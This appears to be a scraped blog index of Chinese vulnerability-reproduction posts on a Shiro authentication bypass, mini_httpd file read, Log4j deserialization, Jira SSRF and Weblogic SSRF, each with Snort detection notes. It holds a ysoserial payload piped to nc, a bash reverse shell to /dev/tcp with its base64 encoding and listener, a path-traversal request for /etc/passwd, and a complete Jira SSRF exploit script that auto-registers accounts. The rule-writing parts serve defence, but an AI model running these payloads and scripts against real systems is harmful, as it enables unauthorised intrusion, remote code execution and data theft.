进入decodeAndCleanUriString方法，发现此方法会以分号将传入的URI进行截断，并将分号以及分号后面的数据进行清空，返回分号前面的URI数据，从而让&#x2F;a&#x2F;b;&#x2F;c变为&#x2F;a&#x2F;b。 继续跟进到Spring拦截器的decodeAndCleanUriString方法中。 从代码中可以发现，Spring对于分号的处理方式与Shiro不同，Spring会先获取分号的位置，并检测分号后是否存在&#x2F;，如果有，将&#x2F;的位置记录在slashIndex变量中，并将分号前的数据与&#x2F;之后的数据进行拼接，从而让&#x2F;a&#x2F;b;&#x2F;c变为&#x2F;a&#x2F;b&#x2F;c。返回处理后的requestURI。 由于Spring与Shiro的decodeAndCleanUriString方法不同，攻击者可以使用分号构造路径，绕过Shiro认证，并可以匹配Spring的动态控制器。 当Shiro 的Ant格式的pathPattern 中的的通配符是不支持匹配路径的，所以&#x2F;hello&#x2F; 不能成功匹配&#x2F;hello&#x2F;1&#x2F; ，也就不会触发authc拦截器进行权限拦截。从而成功绕过了Shiro拦截器，而后再进入到spring拦截器中，&#x2F;hello&#x2F;1&#x2F;与&#x2F;hello&#x2F;1能获取到相同的资源。 漏洞复现直接请求管理页面/admin/，无法访问，将会被重定向到登录页面： 构造恶意请求/xxx/..;/admin/，即可绕过权限校验，访问到管理页面： 参考文章https://www.freebuf.com/vuls/249112.html","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"Shiro","slug":"Shiro","permalink":"https://gryffinbit.top/tags/Shiro/"}],"author":"Gryffinbit"},{"title":"mini_httpd任意文件读取漏洞复现及特征流量分析（CVE-2018-18778）","slug":"mini-httpd任意文件读取漏洞复现及特征流量分析（CVE-2018-18778）","date":"2022-11-30T10:55:26.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/11/30/mini-httpd任意文件读取漏洞复现及特征流量分析（CVE-2018-18778）/","permalink":"https://gryffinbit.top/2022/11/30/mini-httpd%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E7%89%B9%E5%BE%81%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%88CVE-2018-18778%EF%BC%89/","excerpt":"","text":"漏洞详情Mini_httpd 是一个微型的 Http 服务器，在占用系统资源较小的情况下可以保持一定程度的性能（约为 Apache 的 90%），因此广泛被各类 IOT（路由器，交换器，摄像头等）作为嵌入式服务器。而包括华为，zyxel，海康威视，树莓派等在内的厂商的旗下设备都曾采用 Mini_httpd 组件。 漏洞原理在 mini_httpd 开启虚拟主机模式的情况下，用户请求 http://HOST/FILE 将会访问到当前目录下的 HOST/FILE 文件。 1(void) snprintf( vfile, sizeof(vfile), &quot;%s/%s&quot;, req_hostname, f ); 当 HOST=example.com、FILE=index.html 的时候，上述语句结果为example.com/index.html，文件正常读取。当 HOST 为空、FILE=etc/passwd 的时候，上述语句结果为 /etc/passwd。后者被作为绝对路径，于是读取到了 &#x2F;etc&#x2F;passwd，造成任意文件读取漏洞。 漏洞复现1cd Tools/vulhub/mini_httpd/CVE-2018-18778 访问 http://ip:8080 任意文件读取 BP抓包去掉host，&#x2F;etc&#x2F;passwd可换成任意文件名，即可任意文件读取 规则防范没有特征流量可以分析，可以采用禁止访问敏感路径的方式，进行防范 12# 账户信息/etc/passwd 规则编写。可以采用http_method 对GET进行过滤。 参考文章https://www.wangan.com/docs/382","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"mini_httpd","slug":"mini-httpd","permalink":"https://gryffinbit.top/tags/mini-httpd/"}],"author":"Gryffinbit"},{"title":"Log4j反序列化漏洞（CVE-2017-5645）","slug":"Log4j反序列化漏洞（CVE-2017-5645）","date":"2022-11-29T16:20:56.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2022/11/30/Log4j反序列化漏洞（CVE-2017-5645）/","permalink":"https://gryffinbit.top/2022/11/30/Log4j%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-5645%EF%BC%89/","excerpt":"","text":"漏洞详情Apache Log4j是一个用于Java的日志记录库，其支持启动远程日志服务器。Apache Log4j 2.8.2之前的2.x版本中存在安全漏洞。攻击者可利用该漏洞执行任意代码。 在应用程序中添加日志记录最普通的做法就是在代码中嵌入许多的打印语句，这些打印语句可以输出到控制台或文件中，比较好的做法就是构造一个日志操作类来封装此类操作，而不是让一系列的打印语句充斥了代码的主体。 Log4j是Apache的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。 Log4j在工程中可以易用，方便等代替了 System.out 等打印语句，它是 Java下最流行的日志输入工具，一些著名的开源项目，像spring、hibernate、struts都使用该 工具作为日志输入工具，可以帮助调试（有时候debug是发挥不了作用的）和分析。 影响版本Log4j 2.x&lt;&#x3D;2.8.1 漏洞原理 当我们运行代码后，程序会在本地的 8888 端口开始等待接收数据，然后在下图第105行代码处，将接收到的数据转换成 ObjectInputStream 对象数据，最终在 handler.start() 中调用 SocketHandler 类的 run 方法。 在 SocketHandler 类的 run 方法中， ObjectInputStream 对象数据被传入了 ObjectInputStreamLogEventBridge 类的 logEvents 方法，而反序列化就发生在这个方法中。 漏洞复现靶场 12cd Tools/vulhub/log4j/CVE-2017-5645docker-compose up -d 攻击机 软件地址：https://github.com/frohoff/ysoserial 1java -jar ysoserial-all.jar CommonsCollections5 &quot;touch /tmp/testsuccess&quot; | nc ip 4712 靶机检查是否执行成功 反弹shell1bash -i &gt;&amp; /dev/tcp/ip/7777 0&gt;&amp;1 base编码 https://base64.us/ 1YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC83Nzc3IDA+JjE= 攻击机建立监听 1nc -lnvp 7777 攻击机另建终端，执行 1java -jar ysoserial-all.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC83Nzc3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; | nc ip 4712 特征流量Content 包括：👇 12ysoserialCommonsCollections5 端口，注意是4712，规则编写端口部分要写any。另外不能用http_method的参数，因为它规定了端口范围，要在指定的端口范围内才能使用该参数 参考链接https://www.hacking8.com/bug-product/Apache-Log4j/CVE-2017-5645-Log4j-2.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html https://xz.aliyun.com/t/1909","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[],"author":"Gryffinbit"},{"title":"Jira-SSRF漏洞复现及流量分析（snort规则）（CVE-2022-26135）","slug":"Jira-SSRF漏洞复现及流量分析（snort规则）（CVE-2022-26135）","date":"2022-11-23T10:06:06.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2022/11/23/Jira-SSRF漏洞复现及流量分析（snort规则）（CVE-2022-26135）/","permalink":"https://gryffinbit.top/2022/11/23/Jira-SSRF%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%88snort%E8%A7%84%E5%88%99%EF%BC%89%EF%BC%88CVE-2022-26135%EF%BC%89/","excerpt":"","text":"漏洞描述JIRA[4] 是一个缺陷跟踪管理系统，为针对缺陷管理、任务追踪和项目管理的商业性应用软件，.基于Java架构的管理系统，开发者是Atlassian，是集项目计划、任务分配、需求管理、错误跟踪于一体的商业软件。2022年 6月29日，Atlassian官方发布安全公告，在Atlassian Jira 多款产品中存在服务端请求伪造漏洞(SSRF)，经过身份验证的远程攻击者可通过向Jira Core REST API发送特制请求，从而伪造服务端发起请求，从而导致敏感信息泄露，同时为下一步攻击利用提供条件。需注意的是，若服务端开启注册功能，则未授权用户可通过注册获取权限进而利用。 利用范围 Jira Core Server, Jira Software Server, and Jira Software Data Center: Versions after 8.0 and before 8.13.22 8.14.x 8.15.x 8.16.x 8.17.x 8.18.x 8.19.x 8.20.x before 8.20.10 8.21.x 8.22.x before 8.22.4 Jira Service Management Server and Data Center: Versions after 4.0 and before 4.13.22 4.14.x 4.15.x 4.16.x 4.17.x 4.18.x 4.19.x 4.20.x before 4.20.10 4.21.x 4.22.x before 4.22.4 环境搭建https://hub.docker.com/r/weareogury/atlassian-jira-software/tags 12docker pull weareogury/atlassian-jira-software:8.20.8docker run -d -p 7080:8080 weareogury/atlassian-jira-software:8.20.8 按照步骤配置 配置成功 漏洞复现位于com.atlassian.jira.plugin.mobile.util.LinkBuilder.class，URL通过简单的拼接构造，而其中的path来自于location，完全可控。location会从json对象中获取，在获取到URL对象后，再调用httpClientProvider发送Http请求。 因为URL的后半部分是可控的，如果我们简单指定location为@xx.com，那么最终的URL为https:&#x2F;&#x2F;jira-host.com@xx.com，httpClientProvider实际上会对xx.com发送http请求，所以导致了SSRF漏洞产生。 利用链 burp进行改包 1234567891011121314POST /rest/nativemobile/1.0/batch HTTP/2Host: issues.example.comCookie: JSESSIONID=44C6A24A15A1128CE78586A0FA1B1662; seraph.rememberme.cookie=818752%3Acc12c66e2f048b9d50eff8548800262587b3e9b1; atlassian.xsrf.token=AES2-GIY1-7JLS-HNZJ_db57d0893ec4d2e2f81c51c1a8984bde993b7445_linUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36Content-Type: application/jsonAccept: application/json, text/javascript, */*; q=0.01X-Requested-With: XMLHttpRequestOrigin: https://issues.example.comReferer: https://issues.example.com/plugins/servlet/deskAccept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Content-Length: 63&#123;&quot;requests&quot;:[&#123;&quot;method&quot;:&quot;GET&quot;,&quot;location&quot;:&quot;@example.com&quot;&#125;]&#125; exp脚本 项目地址：https://github.com/assetnote/jira-mobile-ssrf-exploit 使用方式： 123# requirements.txtrequestsbeautifulsoup4 1pip3 install -r requirements.txt and then you can use the exploit using: 1python3 exploit.py Help: 1234567891011usage: exploit.py [-h] --target TARGET --ssrf SSRF --mode MODE [--software SOFTWARE] [--username USERNAME] [--email EMAIL] [--password PASSWORD]optional arguments: -h, --help show this help message and exit --target TARGET i.e. http://re.local:8090 --ssrf SSRF i.e. example.com (no protocol pls) --mode MODE i.e. manual or automatic - manual mode you need to provide user auth info --software SOFTWARE i.e. jira or jsd - only needed for manual mode --username USERNAME i.e. admin - only needed for manual jira mode --email EMAIL i.e. admin@example.com - only needed for manual jira service desk mode --password PASSWORD i.e. testing123 - only needed for manual mode If you already have credentials for Jira &#x2F; Jira Service Desk, then set the --mode to manual and the --software argument to either jira or jsd. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191import requestsimport stringimport randomimport argparsefrom bs4 import BeautifulSoup as bs4import urllib3urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)parser = argparse.ArgumentParser()parser.add_argument(&quot;--target&quot;, help=&quot;i.e. http://re.local:8090&quot;, required=True)parser.add_argument(&quot;--ssrf&quot;, help=&quot;i.e. example.com (no protocol pls)&quot;, required=True)parser.add_argument(&quot;--mode&quot;, help=&quot;i.e. manual or automatic - manual mode you need to provide user auth info&quot;, required=True, default=&quot;automatic&quot;)parser.add_argument(&quot;--software&quot;, help=&quot;i.e. jira or jsd - only needed for manual mode&quot;)parser.add_argument(&quot;--username&quot;, help=&quot;i.e. admin - only needed for manual jira mode&quot;)parser.add_argument(&quot;--email&quot;, help=&quot;i.e. admin@example.com - only needed for manual jira service desk mode&quot;)parser.add_argument(&quot;--password&quot;, help=&quot;i.e. testing123 - only needed for manual mode&quot;)args = parser.parse_args()if args.mode == &quot;manual&quot;: if args.software == &quot;&quot;: print(&quot;[*] please pass in a software (jira / jsd)&quot;) if args.software == &quot;jira&quot; and args.email == &quot;&quot; and args.password == &quot;&quot;: print(&quot;[*] must provide an email and password for jira in manual mode&quot;) if args.software == &quot;jsd&quot; and args.username == &quot;&quot; and args.password == &quot;&quot;: print(&quot;[*] must provide an username and password for jira in manual mode&quot;)# atlast - exploit tested on jira &lt; 8.20.3 / jira service desk &lt; 4.20.3-REL-0018# for full list of affected jira versions please see the following URL# https://confluence.atlassian.com/jira/jira-server-security-advisory-29nd-june-2022-1142430667.html# by shubsbanner = &quot;&quot;&quot; _ _ _ __ _| |_| | __ _ ___| |_ / _` | __| |/ _` / __| __| | (_| | |_| | (_| \\__ \\ |_ \\__,_|\\__|_|\\__,_|___/\\__|jira full read ssrf [CVE-2022-26135]brought to you by assetnote [https://assetnote.io] &quot;&quot;&quot;print(banner)proxies = &#123;&#125; # proxy to burp like this - &#123;&quot;https&quot;:&quot;http://localhost:8080&quot;&#125;session = requests.Session()def detect_jira_root(target): root_paths = [&quot;/&quot;, &quot;/secure/&quot; &quot;/jira/&quot;, &quot;/issues/&quot;] jira_found = &quot;&quot; for path in root_paths: test_url = &quot;&#123;&#125;/&#123;&#125;&quot;.format(target, path) r = session.get(test_url, verify=False, proxies=proxies) if &quot;ajs-base-url&quot; in r.text: jira_found = path break return jira_founddef get_jira_signup(target, base_path): test_url = &quot;&#123;&#125;&#123;&#125;&quot;.format(target, base_path) r = session.get(test_url, verify=False, proxies=proxies) signup_enabled = False if &quot;Signup!default.jspa&quot; in r.text: signup_enabled = True return signup_enableddef signup_user(target, base_path): test_url = &quot;&#123;&#125;&#123;&#125;secure/Signup!default.jspa&quot;.format(target, base_path) test_url_post = &quot;&#123;&#125;&#123;&#125;secure/Signup.jspa&quot;.format(target, base_path) r = session.get(test_url, verify=False, proxies=proxies) if &#x27;name=&quot;captcha&quot;&#x27; in r.text: print(&quot;[*] url &#123;&#125; has captchas enabled, please complete flow manually and provide user and password as arg&quot;.format(test_url)) return False, &#123;&#125; if &quot;Mode Breach&quot; in r.text: print(&quot;[*] url &#123;&#125; has signups disabled, trying JSD approach&quot;.format(test_url)) return False, &#123;&#125; # captcha not detected, proceed with registration html_bytes = r.text soup = bs4(html_bytes, &#x27;lxml&#x27;) token = soup.find(&#x27;input&#x27;, &#123;&#x27;name&#x27;:&#x27;atl_token&#x27;&#125;)[&#x27;value&#x27;] full_name = &#x27;&#x27;.join(random.sample((string.ascii_uppercase+string.digits),6)) email = &quot;&#123;&#125;@example.com&quot;.format(full_name) password = &quot;9QWP7zyvfa4nJU9QKu*Yt8_QzbP&quot; paramsPost = &#123;&quot;password&quot;:password,&quot;Signup&quot;:&quot;Sign up&quot;,&quot;atl_token&quot;:token,&quot;fullname&quot;:full_name,&quot;email&quot;:email,&quot;username&quot;:full_name&#125; headers = &#123;&quot;Accept&quot;:&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;Pragma&quot;:&quot;no-cache&quot;,&quot;DNT&quot;:&quot;1&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;Cache-Control&quot;:&quot;no-cache&quot;,&quot;Upgrade-Insecure-Requests&quot;:&quot;1&quot;,&quot;Accept-Language&quot;:&quot;en-US,en;q=0.9&quot;,&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;&#125; cookies = &#123;&quot;atlassian.xsrf.token&quot;:token&#125; r = session.post(test_url_post, data=paramsPost, headers=headers, cookies=cookies, verify=False, proxies=proxies) if &quot;Congratulations!&quot; in r.text: print(&quot;[*] successful registration&quot;) user_obj = &#123;&quot;username&quot;: full_name, &quot;password&quot;: password, &quot;email&quot;: email&#125; return True, user_obj# attempts to signup to root JSDdef register_jsd(target, base_path): register_url = &quot;&#123;&#125;&#123;&#125;servicedesk/customer/user/signup&quot;.format(target, base_path) full_name = &#x27;&#x27;.join(random.sample((string.ascii_uppercase+string.digits),6)) email = &quot;&#123;&#125;@example.com&quot;.format(full_name) password = &quot;9QWP7zyvfa4nJU9QKu*Yt8_QzbP&quot; # try and sign up to the service desk portal without project IDs (easy win?) rawBody = &quot;&#123;&#123;\\&quot;email\\&quot;:\\&quot;&#123;&#125;\\&quot;,\\&quot;fullname\\&quot;:\\&quot;&#123;&#125;\\&quot;,\\&quot;password\\&quot;:\\&quot;&#123;&#125;\\&quot;,\\&quot;captcha\\&quot;:\\&quot;\\&quot;,\\&quot;secondaryEmail\\&quot;:\\&quot;\\&quot;&#125;&#125;&quot;.format(email, full_name, password) headers = &#123;&quot;Origin&quot;:&quot;&#123;&#125;&quot;.format(target),&quot;Accept&quot;:&quot;*/*&quot;,&quot;X-Requested-With&quot;:&quot;XMLHttpRequest&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36&quot;,&quot;Referer&quot;:&quot;&#123;&#125;/servicedesk/customer/portal/1/user/signup&quot;.format(target),&quot;Connection&quot;:&quot;close&quot;,&quot;Pragma&quot;:&quot;no-cache&quot;,&quot;DNT&quot;:&quot;1&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;Cache-Control&quot;:&quot;no-cache&quot;,&quot;Accept-Language&quot;:&quot;en-US,en;q=0.9&quot;,&quot;Content-Type&quot;:&quot;application/json&quot;&#125; r = session.post(register_url, data=rawBody, headers=headers, verify=False, proxies=proxies) if r.status_code == 204: print(&quot;[*] successful registration&quot;) user_obj = &#123;&quot;username&quot;: full_name, &quot;password&quot;: password, &quot;email&quot;: email&#125; return True, user_obj print(&quot;[*] url &#123;&#125; has non-captcha user/pass signups disabled :(&quot;.format(register_url)) register_email_url = &quot;&#123;&#125;&#123;&#125;servicedesk/customer/user/emailsignup&quot;.format(target, base_path) rawBody = &quot;&#123;&#123;\\&quot;email\\&quot;:\\&quot;&#123;&#125;\\&quot;,\\&quot;captcha\\&quot;:\\&quot;\\&quot;,\\&quot;secondaryEmail\\&quot;:\\&quot;\\&quot;&#125;&#125;&quot;.format(email) r = session.post(register_email_url, data=rawBody, headers=headers, verify=False, proxies=proxies) if r.status_code == 204: print(&quot;[*] registration may be possible via emailsignup endpoint&quot;) print(&quot;[*] you will have to manually exploit this with a real email&quot;) print(&quot;[*] visit &#123;&#125;&quot;.format(register_url)) return False, &#123;&#125; if r.status_code == 400: print(&quot;[*] registration may be possible via emailsignup endpoint&quot;) print(&quot;[*] you will have to manually exploit this with a real email and captcha&quot;) print(&quot;[*] visit &#123;&#125;&quot;.format(register_url)) return False, &#123;&#125; print(r.status_code) return False, &#123;&#125;def exploit_ssrf_jsd(target, base_path, user_obj, ssrf_host): login_url = &quot;&#123;&#125;&#123;&#125;servicedesk/customer/user/login&quot;.format(target, base_path) paramsPost = &#123;&quot;os_password&quot;:user_obj[&quot;password&quot;],&quot;os_username&quot;:user_obj[&quot;email&quot;]&#125; headers = &#123;&quot;Origin&quot;:&quot;&#123;&#125;&quot;.format(target),&quot;Accept&quot;:&quot;*/*&quot;,&quot;X-Requested-With&quot;:&quot;XMLHttpRequest&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36&quot;,&quot;Referer&quot;:&quot;&#123;&#125;/servicedesk/customer/portal/1/user/signup&quot;.format(target),&quot;Connection&quot;:&quot;close&quot;,&quot;Pragma&quot;:&quot;no-cache&quot;,&quot;DNT&quot;:&quot;1&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;Cache-Control&quot;:&quot;no-cache&quot;,&quot;Accept-Language&quot;:&quot;en-US,en;q=0.9&quot;,&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;&#125; r = session.post(login_url, data=paramsPost, headers=headers, verify=False, proxies=proxies) if &quot;loginSucceeded&quot; in r.text: print(&quot;[*] successful login&quot;) test_url = &quot;&#123;&#125;&#123;&#125;rest/nativemobile/1.0/batch&quot;.format(target, base_path) rawBody = &quot;&#123;&#123;\\&quot;requests\\&quot;:[&#123;&#123;\\&quot;method\\&quot;:\\&quot;GET\\&quot;,\\&quot;location\\&quot;:\\&quot;@&#123;&#125;\\&quot;&#125;&#125;]&#125;&#125;&quot;.format(ssrf_host) headers = &#123;&quot;Origin&quot;:&quot;&#123;&#125;&quot;.format(target),&quot;Accept&quot;:&quot;*/*&quot;,&quot;X-Requested-With&quot;:&quot;XMLHttpRequest&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36&quot;,&quot;Referer&quot;:&quot;&#123;&#125;/servicedesk/customer/portal/1/user/signup&quot;.format(target),&quot;Connection&quot;:&quot;close&quot;,&quot;Pragma&quot;:&quot;no-cache&quot;,&quot;DNT&quot;:&quot;1&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;Cache-Control&quot;:&quot;no-cache&quot;,&quot;Accept-Language&quot;:&quot;en-US,en;q=0.9&quot;,&quot;Content-Type&quot;:&quot;application/json&quot;&#125; r = session.post(test_url, data=rawBody, headers=headers) print(&quot;Status code: %i&quot; % r.status_code) print(&quot;Response body: %s&quot; % r.content)def exploit_ssrf_jira(target, base_path, user_obj, ssrf_host): login_url = &quot;&#123;&#125;&#123;&#125;login.jsp&quot;.format(target, base_path) paramsPost = &#123;&quot;os_password&quot;:user_obj[&quot;password&quot;],&quot;user_role&quot;:&quot;&quot;,&quot;os_username&quot;:user_obj[&quot;username&quot;],&quot;atl_token&quot;:&quot;&quot;,&quot;os_destination&quot;:&quot;&quot;,&quot;login&quot;:&quot;Log In&quot;&#125; headers = &#123;&quot;Origin&quot;:&quot;&#123;&#125;&quot;.format(target),&quot;Accept&quot;:&quot;*/*&quot;,&quot;X-Requested-With&quot;:&quot;XMLHttpRequest&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36&quot;,&quot;Referer&quot;:&quot;&#123;&#125;/&quot;.format(target),&quot;Connection&quot;:&quot;close&quot;,&quot;Pragma&quot;:&quot;no-cache&quot;,&quot;DNT&quot;:&quot;1&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;Cache-Control&quot;:&quot;no-cache&quot;,&quot;Upgrade-Insecure-Requests&quot;:&quot;1&quot;,&quot;Accept-Language&quot;:&quot;en-US,en;q=0.9&quot;,&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;&#125; r = session.post(login_url, data=paramsPost, headers=headers, verify=False, proxies=proxies) if r.headers[&quot;X-Seraph-LoginReason&quot;] == &quot;OK&quot;: print(&quot;[*] successful login&quot;) test_url = &quot;&#123;&#125;&#123;&#125;rest/nativemobile/1.0/batch&quot;.format(target, base_path) rawBody = &quot;&#123;&#123;\\&quot;requests\\&quot;:[&#123;&#123;\\&quot;method\\&quot;:\\&quot;GET\\&quot;,\\&quot;location\\&quot;:\\&quot;@&#123;&#125;\\&quot;&#125;&#125;]&#125;&#125;&quot;.format(ssrf_host) headers = &#123;&quot;Origin&quot;:&quot;&#123;&#125;&quot;.format(target),&quot;Accept&quot;:&quot;*/*&quot;,&quot;X-Requested-With&quot;:&quot;XMLHttpRequest&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36&quot;,&quot;Referer&quot;:&quot;&#123;&#125;/servicedesk/customer/portal/1/user/signup&quot;.format(target),&quot;Connection&quot;:&quot;close&quot;,&quot;Pragma&quot;:&quot;no-cache&quot;,&quot;DNT&quot;:&quot;1&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;Cache-Control&quot;:&quot;no-cache&quot;,&quot;Accept-Language&quot;:&quot;en-US,en;q=0.9&quot;,&quot;Content-Type&quot;:&quot;application/json&quot;&#125; r = session.post(test_url, data=rawBody, headers=headers) print(&quot;Status code: %i&quot; % r.status_code) print(&quot;Response body: %s&quot; % r.content)# target = &quot;http://re.local:8090&quot;# ssrf_host = &quot;907zer1sxey5czbnnf7p9d1zfqlj98.oastify.com&quot;user_obj = &#123;&#125;successful_jira_signup = Falsesuccessful_jsd_signup = Falsejira_root = detect_jira_root(args.target)if args.mode == &quot;manual&quot; and args.software == &quot;jira&quot;: user_obj = &#123;&quot;username&quot;: args.username, &quot;password&quot;: args.password, &quot;email&quot;: args.email&#125; exploit_ssrf_jira(args.target, jira_root, user_obj, args.ssrf)if args.mode == &quot;manual&quot; and args.software == &quot;jsd&quot;: user_obj = &#123;&quot;username&quot;: args.username, &quot;password&quot;: args.password, &quot;email&quot;: args.email&#125; exploit_ssrf_jsd(args.target, jira_root, user_obj, args.ssrf)if args.mode == &quot;automatic&quot;: signup_enabled = get_jira_signup(args.target, jira_root) successful_jira_signup, user_obj = signup_user(args.target, jira_root) if successful_jira_signup == True: exploit_ssrf_jira(args.target, jira_root, user_obj, args.ssrf) if successful_jira_signup == False: # try to sign up to jira service desk instead successful_jsd_signup, user_obj = register_jsd(args.target, jira_root) if successful_jsd_signup: exploit_ssrf_jsd(args.target, jira_root, user_obj, args.ssrf)if successful_jira_signup == False and successful_jsd_signup == False: print(&quot;[*] sorry boss no ssrf for you today&quot;) 规则提取注意端口范围： 默认的$HTTP_PORTS 1[36,80,81,82,83,84,85,86,87,88,89,90,311,383,555,591,593,631,801,808,818,901,972,1158,1220,1414,1533,1741,1830,1942,2231,2301,2381,2578,2809,2980,3029,3037,3057,3128,3443,3702,4000,4343,4848,5000,5117,5250,5600,6080,6173,6988,7000,7001,7071,7144,7145,7510,7770,7777,7778,7779,8000,8008,8014,8028,8080,8081,8082,8085,8088,8090,8118,8123,8180,8181,8222,8243,8280,8300,8333,8344,8500,8509,8800,8888,8899,8983,9000,9060,9080,9090,9091,9111,9290,9443,9999,10000,11371,12601,13014,15489,29991,33300,34412,34443,34444,41080,44449,50000,50002,51423,53331,55252,55555,56712] 1alert tcp $EXTERNAL_NET any -&gt; $HOME_NET any 特征流量 1/rest/nativemobile/1.0/batch 1/plugins/servlet/desk 可以作为提取的特征 snort需要注意的细节 使用http_method的时候，要相应的规定http的端口（http服务），要限定端口或者是使用$HTTP_PORTS 变量。不然无法触发。 参考文章https://paper.seebug.org/1981/","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"Jira","slug":"Jira","permalink":"https://gryffinbit.top/tags/Jira/"},{"name":"SSRF","slug":"SSRF","permalink":"https://gryffinbit.top/tags/SSRF/"}],"author":"Gryffinbit"},{"title":"Weblogic SSRF漏洞复现及特征流量分析（snort规则）","slug":"Weblogic-SSRF漏洞复现及特征流量分析（snort规则）","date":"2022-11-21T14:43:43.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2022/11/21/Weblogic-SSRF漏洞复现及特征流量分析（snort规则）/","permalink":"https://gryffinbit.top/2022/11/21/Weblogic-SSRF%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E7%89%B9%E5%BE%81%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%88snort%E8%A7%84%E5%88%99%EF%BC%89/","excerpt":"","text":"漏洞详情SSRF 服务端请求伪造(Server-Side Request Forgery),是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。 SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容、加载指定地址的图片、文档等等。【即请求包里的参数值为URL】 攻击者无法直接访问目标内部服务，所以借第三方服务器为跳板，让第三方服务器对内部服务发起请求进而去访问内部服务 ssrf漏洞验证 因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们可以通过抓包分析发送的请求是否是由服务器端发送的来判断是否存在SSRF漏洞 在页面源码中查找访问的资源地址，如果该资源地址类型为http://www.xxx.com/a.php?image=(地址)的可能存在SSRF漏洞 概述 Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。 影响范围 weblogic 版本10.0.2 weblogic 版本10.3.6 漏洞原理判断是否存在漏洞 Weblogic 的 SSRF 